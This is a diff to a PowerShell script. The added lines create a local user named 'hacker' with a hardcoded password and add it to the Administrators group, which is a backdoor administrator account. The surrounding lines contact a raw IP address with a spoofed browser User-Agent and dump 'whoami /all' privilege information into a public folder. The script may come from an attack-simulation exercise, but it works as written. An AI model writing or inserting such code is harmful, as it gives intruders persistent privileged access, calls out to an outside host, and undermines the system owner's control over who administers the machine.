@@ -1,5 +1,10 @@
 $ErrorActionPreference = "Stop";
 
+
+$Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
+
 Invoke-RestMethod -Uri "http://134.209.28.104/4" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
 whoami.exe /all > C:\Users\Public\whoami5.txt
 echo aaa > C:\Users\Public\aaa.txt
